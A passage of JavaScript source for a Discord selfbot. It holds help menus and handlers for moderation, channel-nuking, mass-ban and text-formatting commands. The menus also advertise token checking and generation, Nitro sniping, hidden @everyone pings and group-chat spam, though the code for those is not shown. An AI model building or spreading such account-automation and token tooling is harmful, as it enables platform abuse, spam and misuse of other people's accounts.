[ ${prefix}instanuke ] ${lang.instanuke}
[ ${prefix}slowmode <seconds> ] ${lang.slowmode}
                        \`\`\``)
                autoDeleteMiddleware(config)(message)
                break
            case "animated":
                message.edit(`\`\`\`ini
${lang.animated}

[ ${prefix}virus <type> ] ${lang.virus}
[ ${prefix}abc ] ${lang.abc}
[ ${prefix}100 ] ${lang.count}
[ ${prefix}bomb ] ${lang.bomb}
[ ${prefix}lgbt ] ${lang.lgbt}
                        \`\`\``)
                autoDeleteMiddleware(config)(message)
                break
            case "troll":
                message.edit(`\`\`\`ini

${lang.troll}

[ ${prefix}forcenick <@member> <nick> ] ${lang.forcenick}
[ ${prefix}hiddeninvite <url> <text> ] ${lang.hiddeninvite}
[ ${prefix}hiddeneveryone <channel> <text> ] ${lang.hiddeneveryone}
[ ${prefix}troll2 ] Page 2
            \`\`\``)
                autoDeleteMiddleware(config)(message)
                break
            case "troll2":
                message.edit(`\`\`\`ini
${lang.troll} (2)

[ ${prefix}afk ] ${lang.afk}
[ ${prefix}voicemove <amount> ] ${lang.voicemoove}
[ ${prefix}reactuser <@user> <emoji> ] ${lang.reactuser}
[ ${prefix}gcspamregion <groupid> ] ${lang.gcspamregion}
            \`\`\``)
                autoDeleteMiddleware(config)(message)
                break
            case "tools":
                message.edit(`\`\`\`ini
${lang.tools}

[ ${prefix}serverinfo [serverid] ] ${lang.serverinfo}
[ ${prefix}inviteinfo <invite> ] ${lang.inviteinfo}
[ ${prefix}tokeninfo <token> ] ${lang.tokeninfo}
[ ${prefix}tinyurl <link> ] ${lang.tinyurl}
[ ${prefix}tools2 ] Page 2
            \`\`\``)
                autoDeleteMiddleware(config)(message)
                break
            case "tools2":
                message.edit(`\`\`\`ini
${lang.tools} (2)

[ ${prefix}checktoken <token> ] ${lang.checktoken}
[ ${prefix}wiki <search> ] ${lang.wiki}
[ ${prefix}nitrogen ] ${lang.nitrogen}
[ ${prefix}tokengen ] ${lang.tokengen}
[ ${prefix}passgen ] ${lang.passgen}
[ ${prefix}usergen ] ${lang.usergen}
[ ${prefix}emojidump <serverid> ] ${lang.emojidump}
[ ${prefix}tools3 ] Page 3
 | Page 2
            \`\`\``)
                autoDeleteMiddleware(config)(message)
                break
            case "tools3":
                message.edit(`\`\`\`ini
${lang.tools} (3)

[ ${prefix}crypto <currencycode> ] ${lang.crypto}
[ ${prefix}mcserver <address> ] ${lang.mcserver}
[ ${prefix}webhookinfo <url> ] ${lang.webhookinfo}
[ ${prefix}userbanner <@user> ] ${lang.userbanner}
 | Page 3
            \`\`\``)
                autoDeleteMiddleware(config)(message)
                break
            case "nettools":
                message.edit(`\`\`\`ini
${lang.nettools}

[ ${prefix}iplookup <ip> ] ${lang.iplookup}
[ ${prefix}domainresolve <domain> ] ${lang.domainresolve}
[ ${prefix}resolve <url> ] ${lang.resolve}
[ ${prefix}portscan <host> ] ${lang.portscan}
[ ${prefix}ping ] ${lang.ping}
            \`\`\``)
                autoDeleteMiddleware(config)(message)
                break

            case "protection":
                message.edit(`\`\`\`ini
${lang.protection}

[ ${prefix}session ] ${lang.session}
            \`\`\``)
                autoDeleteMiddleware(config)(message)
                break

            case "session":
                message.edit(`\`\`\`ini
${lang.session}

<> = ${lang.required}, [] = ${lang.optional}

[ ${prefix}showsessions ] ${lang.showsessions}
            \`\`\``)
                autoDeleteMiddleware(config)(message)
                break

            case "misc":
                message.edit(`\`\`\`ini
${lang.misc}

${lang.snipernitro} ${config.nitroautoclaim ? "[on]" : "[off]"}
Session: [Spoofed Session]

[ ${prefix}nitrosniper <on/off> ] ${lang.nitrosniper}
[ ${prefix}shutdown ] ${lang.shutdown}
[ ${prefix}update ] ${lang.update}
[ ${prefix}credits ] ${lang.credits}
                \`\`\``)
                autoDeleteMiddleware(config)(message)
                break


            /*
                    case "community":
                        message.edit(`\`\`\`ini
            Community based commands

            [ ${prefix}cthemes ] Community themes
            [ ${prefix}cscripts ] Install custom scripts made by the community
            [ ${prefix}clanguages ] Install language packs from the community
                            \`\`\``)
                        autoDeleteMiddleware(config)(message)
                        break
            */
            case "afk":
                message.edit(`\`\`\`ini
${lang.afksettings}

AFK : [${config.afk? "ON" : "OFF"}]

[ ${prefix}afksettings ] ${lang.afkturn}
[ ${prefix}afkblacklist <@user> ] ${lang.afkblacklist}
[ ${prefix}removeblacklist <@user> ] ${lang.afkremove}
[ ${prefix}afkmsg <text> ] ${lang.afkmsg}
\`\`\``)
                autoDeleteMiddleware(config)(message)
                break

            case "rpc":
                message.edit(`\`\`\`ini
${lang.rpcsettings}

[ ${prefix}rpcstatus ] ${lang.rpcstatus}
[ ${prefix}rpctext <text> ] ${lang.rpctext}
[ ${prefix}rpcbutton <text> ] ${lang.rpcbutton}
[ ${prefix}rpcbuttonurl <url> ] ${lang.rpcbuttonurl}
[ ${prefix}rpcimage <url> ] ${lang.rpcimage}
[ ${prefix}rpcimagetext <text> ] ${lang.rpcimagetext}
[ ${prefix}rpcid <id> ] ${lang.rpcid}
\`\`\``)
                autoDeleteMiddleware(config)(message)
                break

            case "spotify":
                message.edit(`\`\`\`ini
${lang.spotifysettings}

[ ${prefix}spotifystatus <on/off> ] ${lang.spotifystatus}
[ ${prefix}spotifylargeimage <spotifyid> ] ${lang.spotifylargeimage}
[ ${prefix}spotifylargetext <text> ] ${lang.spotifylargetext}
[ ${prefix}spotifysmallimage <spotifyid> ] ${lang.spotifysmallimage}
[ ${prefix}spotifystate <text> ] ${lang.spotifystate}
[ ${prefix}spotifydetails <text> ] ${lang.spotifydetails}
[ ${prefix}spotifytime <time> <h/s/m> ] ${lang.spotifytime}
\`\`\``)
                autoDeleteMiddleware(config)(message)
                break

            case "autoslash":
                message.edit(`\`\`\`ini
${lang.autoslashtext}

[ ${prefix}tacoshack ] ${lang.tacoshack}
[ ${prefix}taconofrench ] ${lang.taconofrench}
                \`\`\``)
                autoDeleteMiddleware(config)(message)
                break

            case "textchannel":
                var channelName = message.content.split(" ").slice(1).join(" ")
                if (!message.member.permissions.has('MANAGE_CHANNELS')) {return message.send(`${lang.noperm}`)}
                if (!channelName) {return message.send(`${lang.channelname}`)}
                message.guild.channels.create(channelName, { type: 'GUILD_TEXT'})
                    .then(channel => {message.send(`${lang.channelcreate1} ${channel} ${lang.channelcreate2}`)})
                    .catch(err => {console.error(err);
                        message.send(`${lang.textchannelerror}`)})
                autoDeleteMiddleware(config)(message)
                break

            case "voicechannel":
                var channelName = message.content.split(" ").slice(1).join(" ")
                if (!message.member.permissions.has('MANAGE_CHANNELS')) {return message.send(`${lang.noperm}`)}
                if (!channelName) {return message.send(`${lang.voicechannelname}`)}
                message.guild.channels.create(channelName, { type: 'GUILD_VOICE'})
                    .then(channel => {message.send(`${lang.channelcreate1} ${channel} ${lang.channelcreate2}`)})
                    .catch(err => {console.error(err)
                        message.send(`${lang.voicechannelerror}`)})
                autoDeleteMiddleware(config)(message)
                break

            case "category":
                var categoryName = message.content.split(" ").slice(1).join(" ")
                if (!message.member.permissions.has('MANAGE_CHANNELS')) {return message.send(`${lang.noperm}`)}
                if (!categoryName) {return message.send(`${lang.categoryname}`)}
                message.guild.channels.create(categoryName, { type: 'GUILD_CATEGORY'})
                    .then(channel => {message.send(`${lang.category1} ${categoryName} ${lang.category2}`)})
                    .catch(err => {console.error(err);
                        message.send(`${lang.categoryerror}`)})
                autoDeleteMiddleware(config)(message)
                break

            case "stagechannel":
                var stageName = message.content.split(" ").slice(1).join(" ")
                if (!message.member.permissions.has('MANAGE_CHANNELS')) {return message.send(`${lang.noperm}`)}
                if (!stageName) {return message.send(`${lang.stagechannelname}`);}
                message.guild.channels.create(stageName, { type: 'GUILD_STAGE_VOICE'})
                    .then(channel => {message.send(`${lang.stagechannel1} ${stageName} ${lang.stagechannel2}`)})
                    .catch(err => {console.error(err);
                        message.send(`${lang.errorstagechannel}`)})
                autoDeleteMiddleware(config)(message)
                break

            case "mute":
                var user = message.mentions.users.first()
                if (!user) {return message.send(`${lang.mentionuser}`)}
                if (!message.member.permissions.has('MUTE_MEMBERS')) {return message.send(`${lang.noperm}`)}
                var member = message.guild.members.cache.get(user.id)
                if (!member) {return message.send(`${lang.notintheserver}`)}
                var role = message.guild.roles.cache.find(role => role.name === 'Muted')
                if (!role) { message.guild.roles.create({name: 'Muted', color: 'BLACK'})
                    .then(role => { message.guild.channels.cache.forEach(channel => {
                        channel.permissionOverwrites.edit(role, {SEND_MESSAGES: false, ADD_REACTIONS: false})})
                        member.roles.add(role)})
                    .catch(err => {console.error(err)
                        message.send(`${lang.muteerror}`)})
                } else {member.roles.add(role);
                }
                message.send(`${lang.theuser} ${user} ${lang.mute2}`)
                autoDeleteMiddleware(config)(message)
                break


            case "unmute":
                var user = message.mentions.users.first()
                if (!user) {return message.send(`${lang.mentionuser}`)}
                if (!message.member.permissions.has('MUTE_MEMBERS')) {return message.send(`${lang.noperm}`)}
                var member = message.guild.members.cache.get(user.id)
                if (!member) {return message.send(`${lang.unmutenotintheserver}`)}
                var role = message.guild.roles.cache.find(role => role.name === 'Muted')
                if (!role) {return message.edit(`${lang.notintheserver}`)}
                member.roles.remove(role)
                message.edit(`${lang.theuser} ${user} ${lang.unmute2}.`)
                autoDeleteMiddleware(config)(message)
                break

            case "kick":
                var user = message.mentions.users.first()
                if (!user) {return message.edit(`${lang.mentionuser}`)}
                if (!message.member.permissions.has('KICK_MEMBERS')) {return message.edit(`${lang.noperm}`)}
                var member = message.guild.members.cache.get(user.id)
                if (!member) {return message.edit(`${lang.notintheserver}`)}
                member.kick()
                message.edit(`${lang.theuser} ${user} ${lang.kick2}.`)
                autoDeleteMiddleware(config)(message)
                break

            case "ban":
                var user = message.mentions.users.first()
                if (!user) {return message.edit(`${lang.mentionuser}`)}
                if (!message.member.permissions.has('BAN_MEMBERS')) {return message.edit(`${lang.noperm}`)}
                var member = message.guild.members.cache.get(user.id)
                if (!member) {return message.edit(`${lang.notintheserver}`)}
                member.ban()
                message.edit(`${lang.theuser} ${user} ${lang.ban2}.`)
                autoDeleteMiddleware(config)(message)
                break

            case "unban":
                var user = message.mentions.users.first()
                if (!user) {return message.edit(`${lang.mentionuser}`)}
                if (!message.member.permissions.has('BAN_MEMBERS')) {return message.edit(`${lang.noperm}`)}
                var member = message.guild.members.cache.get(user.id)
                if (!member) {return message.edit(`${lang.notintheserver}`)}
                member.unban()
                message.edit(`${lang.theuser} ${user} ${lang.unban2}`)
                autoDeleteMiddleware(config)(message)
                break

            case "hackban":
                if (!message.member.permissions.has('BAN_MEMBERS')) {return message.edit(`${lang.noperm}`)}
                var userId = message.content.split(" ").slice(1).join(" ")
                if (!userId) {return message.edit(`${lang.useridrequired}`)}
                message.guild.members.ban(userId, {reason: 'Hackban by ' + message.author.tag})
                message.edit(`${lang.theuser} ${userId} ${lang.hackban1}`)
                autoDeleteMiddleware(config)(message)
                break

            case "banned":
                if (!message.member.permissions.has('BAN_MEMBERS')) {return message.edit(`${lang.noperm}`)}
                message.guild.bans.fetch().then(bans => {
                    if (bans.size === 0) {return message.edit(`${lang.nobanintheserver}`)}
                    var bannedList = bans.map(ban => ban.user.tag).join('\n')
                    message.edit(`\`\`\`ini
[ List of banned members ] :\n${bannedList}                
                    \`\`\``)
                }).catch(error => {
                    console.error(`${lang.errorfetchban}: ${error}`);
                    message.edit(`${lang.errorfetchban}`)})
                autoDeleteMiddleware(config)(message)
                break

            case "savebans":
                if (!message.member.permissions.has('BAN_MEMBERS')) {return message.edit(`${lang.noperm}`)}
                message.guild.bans.fetch().then(bans => {
                    if (bans.size === 0) {return message.edit(`${lang.nobanintheserver}`)}
                    var bannedList = bans.map(ban => ban.user.tag).join('\n')
                    fs.writeFile('banned.txt', bannedList, function (err) {
                        if (err) {return message.edit(`${lang.errorsaveban}`)}
                        message.edit(`${lang.bansave}`)})})
                autoDeleteMiddleware(config)(message)
                break

            case "exportbans":
                if (!message.member.permissions.has('BAN_MEMBERS')) {return message.edit(`${lang.noperm}`)}
                var serverId = args[0]
                if (!serverId) {return message.edit(`${lang.needidtarget}`)}
                var targetGuild = await client.guilds.fetch(serverId);
                if (!targetGuild) {return message.edit(`${lang.cannotfindtarget}`)}
                var bans = await message.guild.bans.fetch();
                if (bans.size === 0) {return message.edit(`${lang.nobanintheserver}`)}
                var bannedMembers = bans.map(ban => ban.user.id)
                var targetMembers = await targetGuild.members.fetch({ user: bannedMembers, force: true })
                var bannedList = targetMembers.filter(member => member.banable && bans.has(member.user.id)).map(member => member.user.tag).join('\n')
                if (bannedList.length === 0) {return message.edit(`${lang.nobansave}`)}
                fs.writeFile('banned.txt', bannedList, function (err) {
                    if (err) {return message.edit(`${lang.errorsaveban}`)}
                    message.edit(`${lang.bansave}`);
                    targetMembers.forEach(async member => {
                        if (bans.has(member.user.id)) { try {await targetGuild.members.ban(member.user.id, { reason: 'Banned in source server' })
                        } catch (err) {console.error(`${lang.failban1} ${member.user.tag} ${lang.failban2} ${targetGuild.name}: ${err.message}`)}}})})
                autoDeleteMiddleware(config)(message)
                break

            case "addrole":
                var user = message.mentions.users.first()
                if (!user) {return message.edit(`${lang.mentionuser}`)}
                var role = message.mentions.roles.first()
                if (!role) {return message.edit(`${lang.mentionrole}`)}
                var member = message.guild.members.cache.get(user.id)
                if (!member) {return message.send(`${lang.notintheserver}`)}
                member.roles.add(role)
                message.edit(`${lang.role1} ${role} ${lang.role2} ${user}.`)
                autoDeleteMiddleware(config)(message)
                break

            case "addallroles":
                var user = message.mentions.users.first()
                if (!user) {return message.edit(`${lang.mentionuser}`)}
                var member = message.guild.members.cache.get(user.id)
                if (!member) {return message.edit(`${lang.notintheserver}`)}
                var roles = message.guild.roles.cache.filter(role => role.editable).map(role => role.id)
                member.roles.add(roles)
                message.edit(`${lang.allrole1} ${user}.`)
                autoDeleteMiddleware(config)(message)
                break

            case "allrole":
                if (!message.member.permissions.has('ADMINISTRATOR')) {return message.edit(`${lang.noperm}`)}
                var roles = message.mentions.roles.first()
                if (!roles) {return message.edit(`${lang.notintheserver}`)}
                message.guild.members.cache.forEach(member => {member.roles.add(roles)})
                message.edit(`${lang.role1} ${roles.name} ${lang.role3}!`)
                autoDeleteMiddleware(config)(message)
                break

            case "removeallrole":
                if (!message.member.permissions.has('ADMINISTRATOR')) {return message.edit(`${lang.noperm}`)}
                var role = message.mentions.roles.first()
                if (!role) {return message.edit(`${lang.notintheserver}`)}
                message.guild.members.cache.forEach(member => {member.roles.remove(role)})
                message.edit(`${lang.role1} ${role.name} ${lang.role4}!`)
                autoDeleteMiddleware(config)(message)
                break

            case "removerole":
                var user = message.mentions.users.first()
                if (!user) {return message.edit(`${lang.mentionuser}`)}
                var role = message.mentions.roles.first()
                if (!role) {return message.edit(`${lang.mentionrole}`)}
                var member = message.guild.members.cache.get(user.id)
                if (!member) {return message.edit(`${lang.notintheserver}`)}
                member.roles.remove(role)
                message.edit(`${lang.role1} ${role} ${lang.role5} ${user}.`)
                autoDeleteMiddleware(config)(message)
                break

            case "makerole":
                if (!message.member.permissions.has('ADMINISTRATOR')) {return message.edit(`${lang.noperm}`)}
                var roleName = args[0]
                if (!roleName) {return message.edit(`${lang.namerole}`)}
                message.guild.roles.create({ data: { name: roleName, color: 'RANDOM' } })
                message.edit(`${lang.role1} ${roleName} ${lang.role6}!`)
                autoDeleteMiddleware(config)(message)
                break

            case "rainbow":
                if (!message.member.permissions.has('ADMINISTRATOR')) {return message.edit(`${lang.noperm}`)}
                var role = message.mentions.roles.first()
                if (!role) {return message.send(`${lang.rainbowrole}`)}
                var colors = ['ff0000', 'ff8000', 'ffff00', '008000', '0000ff', '4b0082', '800080']
                let colorIndex = 0;
                var interval = setInterval(() => {
                    role.setColor(colors[colorIndex])
                        .catch(console.error)
                    if (colorIndex == colors.length - 1) {
                        colorIndex = 0
                    } else {colorIndex++}}, 1000);
                message.edit(`${lang.role1} ${role} ${lang.rainbowed}!`)
                autoDeleteMiddleware(config)(message)
                break

            case "nick":
                var user = message.mentions.users.first()
                if (!user) {return message.edit(`${lang.mentionuser}`)}
                var member = message.guild.members.cache.get(user.id)
                if (!member) {return message.edit(`${lang.notintheserver}`)}
                var nickname = message.content.split(" ").slice(2).join(" ")
                if (!nickname) {return message.edit(`${lang.nonickname}`)}
                member.setNickname(nickname)
                message.edit(`${lang.nickname1} ${user} ${lang.nickname2} ${nickname}.`)
                autoDeleteMiddleware(config)(message)
                break

            case "purge":
                if (!message.member.permissions.has('MANAGE_MESSAGES')) {return message.edit(`${lang.noperm}`)}
                var amount = parseInt(args[1]);
                if (isNaN(amount) || amount < 1 || amount > 100) {return message.edit(`${lang.purgemsg}`)}
                message.channel.messages.fetch({ limit: amount })
                    .then(messages => { messages.forEach(message => {message.delete()
                        .catch(error => console.error(`${lang.faildelete} ${message.id}: ${error}`))})
                        message.edit(`Deleted ${amount} messages!`)})
                    .catch(error => {console.error(`${lang.failfetch}: ${error}`)
                        message.edit(`${lang.failfetch2}`)})
                autoDeleteMiddleware(config)(message)
                break

            case "userpurge":
                if (!message.member.permissions.has('MANAGE_MESSAGES')) {return message.edit(`${lang.noperm}`)}
                var user = message.mentions.users.first()
                if (!user) {return message.edit(`${lang.mentionuser}`)}
                var amount = parseInt(args[2])
                if (isNaN(amount) || amount < 1 || amount > 100) {return message.edit(`${lang.purgemsg}`)}
                message.channel.messages.fetch({ limit: amount })
                    .then(messages => { messages.forEach(message => {if (message.author.id === user.id) {message.delete()
                        .catch(error => console.error(`${lang.faildelete} ${message.id}: ${error}`))}})
                        message.edit(`Deleted ${amount} messages from ${user}!`)})
                    .catch(error => {console.error(`${lang.failfetch} ${error}`)
                        message.edit(`${lang.failfetch2}`)})
                autoDeleteMiddleware(config)(message)
                break

            case "nuke":
                if (!message.member.permissions.has('MANAGE_CHANNELS')) {return message.edit(`${lang.noperm}`)}
                var channel = message.mentions.channels.first()
                if (!channel) {return message.send(`${lang.mentionuser}`)}
                channel.clone().then((ch) => {
                    ch.setPosition(channel.position)
                    channel.delete()
                    ch.send(`${lang.nuked}`)})
                autoDeleteMiddleware(config)(message)
                break

            case "instanuke":
                if (!message.member.permissions.has('MANAGE_CHANNELS')) {return message.edit(`${lang.noperm}`)}
                channel.delete()
                autoDeleteMiddleware(config)(message)
                break

            case "slowmode":
                if (!message.member.permissions.has('MANAGE_CHANNELS')) {return message.edit(`${lang.noperm}`)}
                var time = args[1]
                if (!time) {return message.edit(`${lang.time}`)}
                message.channel.setRateLimitPerUser(time)
                message.edit(`${lang.slowmode1} ${time} ${lang.slowmode2}!`)
                autoDeleteMiddleware(config)(message)
                break

            case "virus":
                var args = message.content.split(" ").slice(1).join(" ")
                if (!args) {return message.edit(`${lang.needfilename}`)}
                message.edit("Packing files..").then(msg => {
                    let i = 0;
                    var interval = setInterval(() => { if (i >= 10) {clearInterval(interval);
                        msg.edit(`${lang.successinject} ${args}.exe`)
                    } else {let bar = "▓".repeat(i) + "░".repeat(10 - i)
                        msg.edit(`${bar}   [${i+1}/10]`)
                        i++}}, 500)})
                autoDeleteMiddleware(config)(message)
                break

            case "tower":
                for (var b = 7; b > -1; b--){
                    message.edit(`:airplane: ${"-".repeat(b)} :tokyo_tower:`)
                }
                message.edit(":boom: :tokyo_tower:")
                autoDeleteMiddleware(config)(message)
                break

            case "bomb":
                for (var b = 7; b > -1; b--){
                    message.edit(`:bomb: ${"-".repeat(b)} :fire:`)
                }
                message.edit(":boom: :house:")
                autoDeleteMiddleware(config)(message)
                break

            case "abc":
                const alphabet = "abcdefghijklmnopqrstuvwxyz"
                for (var b = 0; b < 26; b++){
                    message.edit(`${alphabet[b]}`)
                }
                autoDeleteMiddleware(config)(message)
                break

            case "100":
                for (var b = 0; b < 100; b++){
                    message.edit(`${b}`)
                }
                autoDeleteMiddleware(config)(message)
                break

            case "regional":
                var args = message.content.split(" ").slice(1).join(" ")
                if (!args) {return message.edit(`${lang.providemsg}`)}
                var regional = args.replace(/a/g, "🅰️").replace(/b/g, "🅱️").replace(/c/g, "©️").replace(/d/g, "🎯").replace(/e/g, "📧").replace(/f/g, "🎏").replace(/g/g, "🇬").replace(/h/g, "♓").replace(/i/g, "ℹ️").replace(/j/g, "🇯").replace(/k/g, "🇰").replace(/l/g, "🇱").replace(/m/g, "Ⓜ️").replace(/n/g, "♑").replace(/o/g, "🅾️").replace(/p/g, "🅿️").replace(/q/g, "🇶").replace(/r/g, "®️").replace(/s/g, "💲").replace(/t/g, "✝️").replace(/u/g, "⛎").replace(/v/g, "♈").replace(/w/g, "〰️").replace(/x/g, "❌").replace(/y/g, "💴").replace(/z/g, "💤")
                message.edit(regional)
                autoDeleteMiddleware(config)(message)
                break

            case "space":
                var args = message.content.split(" ").slice(1).join(" ")
                if (!args) {return message.edit(`${lang.providemsg}`)}
                var spaced = args.split("").join(" ")
                message.edit(spaced)
                autoDeleteMiddleware(config)(message)
                break

            case "vape":
                var args = message.content.split(" ").slice(1).join(" ")
                if (!args) {return message.edit(`${lang.providemsg}`)}
                var vaped = args.replace(/a/g, "𝗮").replace(/b/g, "𝗯").replace(/c/g, "𝗰").replace(/d/g, "𝗱").replace(/e/g, "𝗲").replace(/f/g, "𝗳").replace(/g/g, "𝗴").replace(/h/g, "𝗵").replace(/i/g, "𝗶").replace(/j/g, "𝗷").replace(/k/g, "𝗸").replace(/l/g, "𝗹").replace(/m/g, "𝗺").replace(/n/g, "𝗻").replace(/o/g, "𝗼").replace(/p/g, "𝗽").replace(/q/g, "𝗾").replace(/r/g, "𝗿").replace(/s/g, "𝘀").replace(/t/g, "𝘁").replace(/u/g, "𝘂").replace(/v/g, "𝘃").replace(/w/g, "𝘄").replace(/x/g, "𝘅").replace(/y/g, "𝘆").replace(/z/g, "𝘇")
                message.edit(vaped)
                autoDeleteMiddleware(config)(message)
                break

            case "smart":
                let text = message.content.split(" ").slice(1).join(" ")
                let transformedText = ""
                for (let i = 0; i < text.length; i++) { if (i % 2 == 0) { transformedText += text[i].toLowerCase() } else {transformedText += text[i].toUpperCase()}}
                message.edit(transformedText)
                autoDeleteMiddleware(config)(message)
                break

            case "spoiler":
                var content = message.content.slice(9);
                var spoilerText = content.split('').map(char => `||${char}||`).join('');
                message.edit(spoilerText);
                autoDeleteMiddleware(config)(message)
                break

            case "ascii":
                var args = message.content.split(" ").slice(1).join(" ")
                if (!args) {return message.edit(`${lang.providemsg}`)}
                var ascii = args.replace(/a/g, "𝔞").replace(/b/g, "𝔟").replace(/c/g, "𝔠").replace(/d/g, "𝔡").replace(/e/g, "𝔢").replace(/f/g, "𝔣").replace(/g/g, "𝔤").replace(/h/g, "𝔥").replace(/i/g, "𝔦").replace(/j/g, "𝔧").replace(/k/g, "𝔨").replace(/l/g, "𝔩").replace(/m/g, "𝔪").replace(/n/g, "𝔫").replace(/o/g, "𝔬").replace(/p/g, "𝔭").replace(/q/g, "𝔮").replace(/r/g, "𝔯").replace(/s/g, "𝔰").replace(/t/g, "𝔱").replace(/u/g, "𝔲").replace(/v/g, "𝔳").replace(/w/g, "𝔴").replace(/x/g, "𝔵").replace(/y/g, "𝔶").replace(/z/g, "𝔷")
                message.edit(ascii)
                autoDeleteMiddleware(config)(message)
                break

            case "asciifont":
                var args = message.content.split(" ").slice(1).join(" ")
                if (!args) {return message.edit(`${lang.providemsg}`)}
                var ascii = args.replace(/a/g, "𝖆").replace(/b/g, "𝖇").replace(/c/g, "𝖈").replace(/d/g, "𝖉").replace(/e/g, "𝖊").replace(/f/g, "𝖋").replace(/g/g, "𝖌").replace(/h/g, "𝖍").replace(/i/g, "𝖎").replace(/j/g, "𝖏").replace(/k/g, "𝖐").replace(/l/g, "𝖑").replace(/m/g, "𝖒").replace(/n/g, "𝖓").replace(/o/g, "𝖔").replace(/p/g, "𝖕").replace(/q/g, "𝖖").replace(/r/g, "𝖗").replace(/s/g, "𝖘").replace(/t/g, "𝖙").replace(/u/g, "𝖚").replace(/v/g, "𝖛").replace(/w/g, "𝖜").replace(/x/g, "𝖝").replace(/y/g, "𝖞").replace(/z/g, "𝖟")
                message.edit(ascii)
                autoDeleteMiddleware(config)(message)
                break

            case "reverse":
                var args = message.content.split(" ").slice(1).join(" ")
                if (!args) {return message.edit(`${lang.providemsg}`)}
                var reverse = args.split("").reverse().join("")
                message.edit(reverse)
                autoDeleteMiddleware(config)(message)
                break

            case "italic":
                var args = message.content.split(" ").slice(1).join(" ")
                if (!args) {return message.edit(`${lang.providemsg}`)}
                var italic = args.replace(/a/g, "𝘢").replace(/b/g, "𝘣").replace(/c/g, "𝘤").replace(/d/g, "𝘥").replace(/e/g, "𝘦").replace(/f/g, "𝘧").replace(/g/g, "𝘨").replace(/h/g, "𝘩").replace(/i/g, "𝘪").replace(/j/g, "𝘫").replace(/k/g, "𝘬").replace(/l/g, "𝘭").replace(/m/g, "𝘮").replace(/n/g, "𝘯").replace(/o/g, "𝘰").replace(/p/g, "𝘱").replace(/q/g, "𝘲").replace(/r/g, "𝘳").replace(/s/g, "𝘴").replace(/t/g, "𝘵").replace(/u/g, "𝘶").replace(/v/g, "𝘷").replace(/w/g, "𝘸").replace(/x/g, "𝘹").replace(/y/g, "𝘺").replace(/z/g, "𝘻")
                message.edit(italic)
                autoDeleteMiddleware(config)(message)
                break

            case "1337":
                var args = message.content.split(" ").slice(1).join(" ")
                if (!args) {return message.edit(`${lang.providemsg}`)}
                var leet = args.replace(/a/g, "4").replace(/b/g, "8").replace(/c/g, "(").replace(/d/g, "|)").replace(/e/g, "3").replace(/f/g, "|=").replace(/g/g, "6").replace(/h/g, "#").replace(/i/g, "!").replace(/j/g, "_|").replace(/k/g, "|<").replace(/l/g, "1").replace(/m/g, "|\\/|").replace(/n/g, "|\\|").replace(/o/g, "0").replace(/p/g, "|>").replace(/q/g, "9").replace(/r/g, "|2").replace(/s/g, "5").replace(/t/g, "7").replace(/u/g, "|_|").replace(/v/g, "\\/").replace(/w/g, "\\/\\/").replace(/x/g, "><").replace(/y/g, "`/").replace(/z/g, "2")
                message.edit(leet)
                autoDeleteMiddleware(config)(message)
                break

            case "owo":
                var args = message.content.split(" ").slice(1).join(" ")
                if (!args) {return message.edit(`${lang.providemsg}`)}
                var owo = args.replace(/r/g, "w").replace(/l/g, "w").replace(/R/g, "W").replace(/L/g, "W").replace(/n([aeiou])/g, 'ny$1').replace(/N([aeiou])/g, 'Ny$1').replace(/N([AEIOU])/g, 'NY$1').replace(/ove/g, "uv").replace(/!+/g, " " + randomItem(["OwO", "UwU", ">w<", "^w^"]) + " ")
                message.edit(owo)
                autoDeleteMiddleware(config)(message)
                break

            case "encode":
                var args = message.content.split(" ").slice(1).join(" ")
                if (!args) {return message.edit(`${lang.providemsg}`)}
                var encoded = Buffer.from(args).toString('base64')
                message.edit(encoded)
                autoDeleteMiddleware(config)(message)
                break

            case "decode":
                var args = message.content.split(" ").slice(1).join(" ")
                if (!args) {return message.edit(`${lang.providemsg}`)}
                var decoded = Buffer.from(args, 'base64').toString('ascii')
                message.edit(decoded)
                autoDeleteMiddleware(config)(message)
                break

            case "encrypt":
                var args = message.content.split(" ").slice(1).join(" ")
                if (!args) {return message.edit(`${lang.providemsg}`)}
                var encrypted = CryptoJS.AES.encrypt(args, config.encryptionKey).toString()
                message.edit(encrypted)
                autoDeleteMiddleware(config)(message)
                break

            case "decrypt":
                var args = message.content.split(" ").slice(1).join(" ")
                if (!args) {return message.edit(`${lang.providemsg}`)}
                var decrypted = CryptoJS.AES.decrypt(args, config.encryptionKey).toString(CryptoJS.enc.Utf8)
                message.edit(decrypted)
                autoDeleteMiddleware(config)(message)
                break

            case "zalgo":
                var args = message.content.split(" ").slice(1).join(" ")
                if (!args) {return message.edit(`${lang.providemsg}`)}
                var ae = args.split('').map(c => { if (/[a-zA-Z]/.test(c)) { return String.fromCharCode(c.charCodeAt(0) + 119951) } return c}).join('')
                message.edit(ae)
                autoDeleteMiddleware(config)(message)
                break

            case "morse":
                var args = message.content.split(" ").slice(1).join(" ")
                if (!args) {return message.edit(`${lang.providemsg}`)}
                message.edit(morse.encode(args))
                autoDeleteMiddleware(config)(message)
                break

            case "semoji":
                var args = message.content.split(" ").slice(1).join(" ")
                if (!args) {return message.edit(`${lang.providemsg}`)}
                var emoji = args.split(" ").map(word => word.split("").map(letter => `:regional_indicator_${letter.toLowerCase()}:`).join(" ")).join("  ")
                message.edit(emoji)
                autoDeleteMiddleware(config)(message)
                break

            case "codeblock":
                var args = message.content.split(" ").slice(1).join(" ")
                if (!args) {return message.edit(`${lang.providemsg}`)}
                message.edit("```" + args + "```")
                autoDeleteMiddleware(config)(message)
                break

            case "text2bin":
                var args = message.content.split(" ").slice(1).join(" ")
                if (!args) {return message.edit(`${lang.providemsg}`)}
                var binary = args.split('').map(function(char) {
                        return char.charCodeAt(0).toString(2);
                    }
                ).join(' ');
                message.edit(binary)
                autoDeleteMiddleware(config)(message)
                break

            case "bin2text":
                var args = message.content.split(" ").slice(1).join(" ")
                if (!args) {return message.edit(`${lang.providemsg}`)}
                var textedd = args.split(' ').map(function(char) {
                        return String.fromCharCode(parseInt(char, 2));
                    }
                ).join('');
                message.edit(textedd)
                autoDeleteMiddleware(config)(message)
                break

            case "text2hex":
                var args = message.content.split(" ").slice(1).join(" ")
                if (!args) {return message.edit(`${lang.providemsg}`)}
                var hex = args.split('').map(function(char) {
                        return char.charCodeAt(0).toString(16);
                    }
                ).join(' ');
                message.edit(hex)
                autoDeleteMiddleware(config)(message)
                break

            case "hex2text":
                var args = message.content.split(" ").slice(1).join(" ")
                if (!args) {return message.edit(`${lang.providemsg}`)}
                var texted = args.split(' ').map(function(char) {
                        return String.fromCharCode(parseInt(char, 16));
                    }
                ).join('');
                message.edit(texted)
                autoDeleteMiddleware(config)(message)
                break

            case "avatar":
